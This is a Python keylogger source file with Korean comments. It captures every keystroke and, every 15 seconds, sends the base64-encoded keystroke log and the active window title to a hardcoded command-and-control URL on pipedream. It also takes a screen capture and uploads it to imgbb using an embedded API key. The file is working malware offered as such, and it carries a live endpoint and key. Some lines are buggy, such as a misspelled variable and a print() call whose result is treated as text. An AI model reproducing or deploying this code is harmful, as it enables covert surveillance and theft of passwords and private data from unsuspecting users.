import keyboard
from threading import Timer
from base64 import b64encode
import requests

import pyautogui
import io

from win32gui import GetWindowText, GetForegroundWindow

C2_URL = "https://eotn219suszodol.m.pipedream.net" #c2서버 만들기

#이미지 관련 URL
KEY_IMG_BB = "7d308d4d8ed53ade50c1405859904e25"
IMG_BB_URL = "https://api.imgbb.com/1/upload"

class Keylogger:
    def __init__(self, interval):

        self.interval = interval
        self.log =""

    def callback(self, event): #키보드를 누르고 떌떄마다 호출됨
        # key UP is occured
        #print(event.name) #이벤트에 네임을 붙이면 누른게 모여서 아이디가 됨
        name = event.name
        if len(name) >1:
            name = name.replace(" ","_")
            naem = name.upper() 
            name = "[{}]".format(name) #특수문자일 경우 보기좋게 안에 넣기
        
        self.log += name

    def send_server(self):
        leaked_bytes = (self.log).encode("ascii")
        leaked_info = b64encode(leaked_bytes)
        process_text = print(GetWindowText(GetForegroundWindow))
        leaked_process = (process_text).encode("utf-8")
        leaked_process = b64encode(leaked_process)

        params = {"k":leaked_info , "p":leaked_process}
        res = requests.get(C2_URL, params=params)

        #이미지도 보내기
        #실행하면 사진 스크린샷이 찍혀서 생성됨
        screenshot = pyautogui.screenshot()
        #print(type(screenshot))

        #파일 편하게 서버에 보내기 위한 코드들
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG") #이미지 바이트에 들어감
        img_bytes =img_bytes.getvalue() #이미지 데이터정보가 나옴
        img_encoded = b64encode(img_bytes)
        payload = {"key": KEY_IMG_BB,"image":img_encoded}
        res2 = requests.post(IMG_BB_URL, payload)

        


    def report(self):
        
        if self.log != "":
            self.send_server()

        self.log = ""

        # This function gets called every `self.interval`
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()


    def start(self):
        keyboard.on_release(callback=self.callback) #이벤트를 등록하게 됨 키를 눌렀다 뗼때 콜백을 부름
        self.report()
        keyboard.wait() #프로그램이 꺼지지 않도록 하기

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=15)
    keylogger.start()